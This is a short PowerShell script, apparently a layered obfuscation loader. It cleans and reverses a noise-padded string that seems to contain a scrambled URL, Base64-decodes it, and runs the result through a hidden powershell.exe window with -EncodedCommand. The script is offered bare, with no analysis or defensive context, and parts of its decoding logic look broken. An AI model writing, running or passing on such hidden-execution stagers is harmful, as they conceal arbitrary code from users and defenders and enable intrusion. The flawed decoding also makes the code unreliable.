# ───────────  LAYER 1 – NOISE + REVERSAL  ───────────
$o = 'XUc^Ow=bA*/wWK==gQcXMgB=gXcW9w4QdQ@/Bu=bea/_uoy=W//:sptht^"Ag|s^|^@^y78'
$i = $o -replace '[^A-Za-z0-9+/=]', ''

$chars = $i.ToCharArray()
[Array]::Reverse($chars)
$d = -join $chars                # fully-reversed Base-64
# Fix padding: move any leading '=' to end and add extra padding if needed
$leadingPad = [regex]::Match($d, '^(=+)').Value
if ($leadingPad -ne '') {
	$d = $d.TrimStart('=') + $leadingPad
}
$missingPad = (4 - ($d.Length % 4)) % 4
if ($missingPad -gt 0) {
	$d += '=' * $missingPad
}

# ───────────  LAYER 2 – BASE-64 DECODE  ────────────
$e = [Text.Encoding]::Unicode.GetString(
         [Convert]::FromBase64String($d)
     )

# ───────────  LAYER 3 – RUNTIME CODE-GEN  ───────────
& powershell.exe -NoLogo -NoProfile -WindowStyle Hidden -EncodedCommand $e
